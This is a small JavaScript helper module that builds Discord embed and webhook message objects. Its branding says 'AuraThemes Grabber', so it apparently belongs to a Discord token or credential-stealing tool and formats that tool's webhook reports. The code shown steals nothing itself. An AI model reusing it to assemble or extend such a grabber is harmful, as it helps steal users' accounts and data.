const { EmbedBuilder } = require('discord.js');

const getEmbeds = ({ author = {}, thumbnail, color = "", title = "", desc = "", fields = [] }) => {
    try {
        let { name = "-", icon_url = "https://i.imgur.com/WkKXZSl.gif" } = author;
        let builder = new EmbedBuilder()
            .setAuthor({ name: name, iconURL: icon_url })
            .setColor(color === "" ? "#c267ff" : color)
            if (thumbnail) {
                builder.setThumbnail(thumbnail)
            }
            if (title) {
                builder.setTitle(title)
            } else {
                builder.setTitle("AuraThemes Grabber")
            }
            if (desc) {
                builder.setDescription(desc);
            }
        if (fields.length > 0) {
            builder.addFields(...fields);
        }
        return builder
            .setFooter({ text: "AuraThemes Grabber - https://discord.gg/aurathemes", iconURL: "https://i.imgur.com/WkKXZSl.gif" })
            .setTimestamp();
    } catch (e) {
        return null;
    }
}


const send = (e) => {
    try {
        return {
            embeds: [e],
            username: '@AuraThemes',
            avatarURL: 'https://i.imgur.com/WkKXZSl.gif'
        };
    } catch (e) {
        return {};
    }
}

module.exports = {
    getEmbeds,
    send
}